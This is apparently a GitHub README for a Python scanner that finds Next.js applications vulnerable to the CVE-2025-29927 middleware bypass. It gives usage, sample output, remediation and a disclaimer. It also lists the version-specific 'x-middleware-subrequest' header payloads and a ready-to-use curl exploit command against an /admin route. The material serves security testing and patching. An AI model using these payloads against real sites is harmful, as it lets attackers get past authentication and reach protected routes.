# 🔒 Next.js Middleware Bypass Scanner (CVE-2025-29927) 🛡️

![GitHub stars](https://img.shields.io/github/stars/pentestfunctions/nextjs-middleware?style=social)
![License](https://img.shields.io/badge/license-MIT-blue)
![Python Version](https://img.shields.io/badge/python-3.6%2B-blue)

## 🚨 About CVE-2025-29927

A critical vulnerability affecting Next.js applications using middleware that allows attackers to bypass middleware security controls by manipulating request headers.

This scanner efficiently detects vulnerable Next.js applications and provides exploitation guidance.

<p align="center">
  <img src="https://github.com/pentestfunctions/nextjs-middleware/blob/main/images/middleware.gif?raw=true">
</p>

## 🌟 Features

- 🔍 Automatically detects Next.js applications and version hints
- 🛡️ Identifies protected routes that might be vulnerable
- 🚀 Multi-threaded scanning for faster results
- 📊 Rich visual reports (optional)
- 🧪 Multiple payload variations for different Next.js versions
- 📝 Detailed vulnerability reporting
- 💻 Works with both modern and legacy Next.js applications (v11.x - v15.1.x)
- 🔮 Advanced Next.js version detection
- 💉 Generates ready-to-use curl commands for exploitation proof-of-concept
- 🔄 Robust redirect chain analysis to detect successful bypasses

## 📋 Requirements

- Python 3.6+
- Required packages:
  ```
  requests
  colorama (for basic output)
  rich (optional, for enhanced output)
  ```

## 🔧 Installation

```bash
# Clone the repository
git clone https://github.com/pentestfunctions/nextjs-middleware.git
cd nextjs-middleware

# Install dependencies
pip install -r requirements.txt
```

## 🚀 Usage

Basic scan:
```bash
python CVE-2025-29927.py http://example.com
```

Advanced options:
```bash
# Verbose output
python CVE-2025-29927.py example.com -v

# Save results to file
python CVE-2025-29927.py example.com -o results.json

# Adjust thread count
python CVE-2025-29927.py example.com -t 10

# Simple output (no rich formatting)
python CVE-2025-29927.py example.com --no-rich
```

## 📊 Example Output

When a vulnerability is detected, the scanner provides detailed information:

```
=====================================
CVE-2025-29927 SCAN REPORT FOR https://example.com
=====================================

SUMMARY:
  Target: https://example.com
  Next.js Detected: Yes
  Version Detected: Yes (v13.4.12)
  Routes Tested: 5
  Vulnerable: Yes

VERSION DETECTION CLUES:
  - Next.js headers found: x-nextjs-render
  - Build ID: 1a2b3c4d5e6f7g8h9i0j
  - App Router indicators detected (likely Next.js 13+)

VULNERABILITY DETAILS:

  Route: /admin
  Vulnerable to:
    - Next.js v13.x-15.1.x (standard location)
    - Next.js v13.x+ (app directory)

EXPLOIT COMMAND:
  curl -i -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' https://example.com/admin
```

![Scanner Output Example](https://raw.githubusercontent.com/pentestfunctions/nextjs-middleware/main/screenshots/scanner_output.png)

## 🧪 How It Works

1. 🔍 Detects if the target is using Next.js through various indicators in HTTP responses
2. 🔎 Identifies protected routes based on redirect behavior or authentication patterns
3. 🧰 Tests vulnerable header payloads against protected routes
4. 🔄 Compares response behavior with and without the vulnerability payloads
5. 📝 Reports findings with exploitation guidance and proof-of-concept commands

The scanner works by exploiting how Next.js middleware handles certain headers. By sending specifically crafted values in the `x-middleware-subrequest` header, attackers can bypass security checks implemented in middleware functions.

### 🎯 Tested Headers and Payloads

The scanner tests the following payloads targeting different Next.js versions and configurations:

| Header | Value | Target |
|--------|-------|--------|
| `x-middleware-subrequest` | `middleware:middleware:middleware:middleware:middleware` | Next.js v13.x-15.1.x (standard location) |
| `x-middleware-subrequest` | `pages/_middleware` | Next.js v11.1.4-12.1.x (pages router) |
| `x-middleware-subrequest` | `middleware` | Next.js v12.2.x (standard location) |
| `x-middleware-subrequest` | `src/middleware` | Next.js v12.2.x (src directory) |
| `x-middleware-subrequest` | `src/middleware:src/middleware:src/middleware:src/middleware:src/middleware` | Next.js v13.x-15.1.x (src directory) |
| `x-middleware-subrequest` | `app/middleware:app/middleware:app/middleware:app/middleware:app/middleware` | Next.js v13.x+ (app directory) |
| `x-middleware-subrequest` | `src/app/middleware:src/app/middleware:src/app/middleware:src/app/middleware:src/app/middleware` | Next.js v13.x+ (src/app directory) |

When a vulnerable application receives these headers, the middleware may be bypassed entirely, allowing access to protected routes and resources.

## 🔬 Affected Versions

- Next.js v11.1.4 - v12.1.x (pages router middleware)
- Next.js v12.2.x (using middleware.js/ts)
- Next.js v13.x - v15.1.x (using middleware.js/ts)

Patched versions:
- Next.js v15.2.3+
- Next.js v14.2.25+

## 🛡️ Remediation

1. Update to the patched version:
   - Next.js 15.x: Update to v15.2.3 or newer
   - Next.js 14.x: Update to v14.2.25 or newer

2. If updating is not immediately possible:
   - Block the `x-middleware-subrequest` header at your web server or proxy level

#### For Cloudflare:
Create a Firewall Rule to block requests containing the `x-middleware-subrequest` header.

## ⚠️ Disclaimer

This tool is intended for security professionals to assess their own systems or systems they have permission to test. Do not use against systems without explicit permission. The author is not responsible for any misuse.

---
Created with ❤️ by [pentestfunctions](https://github.com/pentestfunctions)
